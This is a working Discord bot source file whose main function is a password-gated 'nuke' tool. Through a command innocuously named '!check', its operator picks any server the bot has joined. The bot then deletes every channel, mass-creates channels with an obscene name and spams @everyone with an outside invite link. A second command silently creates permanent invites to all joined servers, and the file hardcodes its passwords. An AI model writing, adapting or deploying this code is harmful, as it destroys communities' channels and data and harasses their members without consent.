const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  MessageFlags
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== MESSAGE COMMANDS ======================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;
  const content = message.content.trim().toLowerCase();

  if (content === '!check') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔍 Remote Server Control')
      .setDescription('Select server → Nuke')
      .setFooter({ text: 'Only you can use this' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`check_start_${message.author.id}`)
        .setLabel('Start')
        .setStyle(ButtonStyle.Primary)
    );

    return message.reply({ embeds: [embed], components: [row] });
  }

  if (content === '!inv') {
    const guilds = Array.from(client.guilds.cache.values());
    if (guilds.length === 0) return message.reply('❌ Bot is not in any servers.');

    const embed = new EmbedBuilder().setColor('#00ffff').setTitle('📋 Servers & Invites');
    for (const guild of guilds) {
      let inviteLink = 'Failed';
      try {
        const inv = await guild.invites.create(guild.channels.cache.find(c => c.type === 0)?.id, { maxAge: 0 });
        inviteLink = inv.url;
      } catch {}
      embed.addFields({ name: guild.name, value: `Members: ${guild.memberCount}\nInvite: ${inviteLink}` });
    }
    message.reply({ embeds: [embed] });
  }
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userId = parts[parts.length - 1];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
    }

    if (action !== 'check') return;

    if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
      const modal = new ModalBuilder()
        .setCustomId(`check_modal_${interaction.user.id}`)
        .setTitle('Enter Password');
      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
      ));
      return await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });

      const guilds = Array.from(client.guilds.cache.values());
      const options = guilds.map(g => ({
        label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
        value: g.id
      }));

      const select = new StringSelectMenuBuilder()
        .setCustomId(`check_server_select_${interaction.user.id}`)
        .setPlaceholder('Select server')
        .addOptions(options);

      await interaction.reply({
        content: '✅ Password accepted. Select server:',
        components: [new ActionRowBuilder().addComponents(select)],
        flags: MessageFlags.Ephemeral
      });
      userSessions.set(interaction.user.id, {});
    }

    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
      await interaction.deferUpdate();
      const guild = client.guilds.cache.get(interaction.values[0]);
      userSessions.set(interaction.user.id, { guildId: guild.id });

      const actionSelect = new StringSelectMenuBuilder()
        .setCustomId(`check_action_select_${interaction.user.id}`)
        .setPlaceholder('Choose action')
        .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);

      await interaction.editReply({
        content: `**Selected:** ${guild.name}`,
        components: [new ActionRowBuilder().addComponents(actionSelect)]
      });
    }

    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
      if (interaction.values[0] === 'nuke') {
        const modal = new ModalBuilder()
          .setCustomId(`check_nuke_modal_${interaction.user.id}`)
          .setTitle('Confirm Nuke');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
        ));
        return await interaction.showModal(modal);
      }
    }

    // ==================== AGGRESSIVE NUKE ====================
    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });

      await interaction.deferReply({ flags: MessageFlags.Ephemeral });

      const session = userSessions.get(interaction.user.id);
      const guild = client.guilds.cache.get(session?.guildId);
      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

      const delay = ms => new Promise(r => setTimeout(r, ms));
      const invite = 'https://discord.gg/veynettas';

      try {
        await interaction.editReply({ content: `☢️ **FAME TAKEOVER** started on **${guild.name}**...` });

        // Delete everything
        for (const ch of guild.channels.cache.values()) {
          await ch.delete().catch(() => {});
          await delay(400);
        }

        await interaction.followUp({ content: '🔨 Starting infinite fucked-by-veynetta channels + spam...', flags: MessageFlags.Ephemeral });

        // Aggressive infinite loop
        for (let round = 0; round < 10; round++) {
          // Create many channels
          for (let i = 0; i < 12; i++) {
            try {
              await guild.channels.create({ name: 'fucked-by-veynetta', type: 0 });
            } catch {}
          }

          // Spam @everyone fast
          const channels = guild.channels.cache.filter(c => c.name === 'fucked-by-veynetta');
          for (const ch of channels.values()) {
            for (let i = 0; i < 10; i++) {
              ch.send(`@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`).catch(() => {});
            }
          }

          await delay(800);
        }

        await interaction.followUp({ 
          content: `✅ **AGGRESSIVE NUKE ACTIVE**\n• Infinite \`fucked-by-veynetta\` channels being created\n• @everyone spam running with new invite`,
          flags: MessageFlags.Ephemeral 
        });

      } catch (err) {
        console.error(err);
        await interaction.followUp({ content: '⚠️ Nuke running (rate limits active).', flags: MessageFlags.Ephemeral }).catch(() => {});
      }

      userSessions.delete(interaction.user.id);
    }

  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      interaction.reply({ content: '❌ Something went wrong.', flags: MessageFlags.Ephemeral }).catch(() => {});
    }
  }
});

client.login(TOKEN);
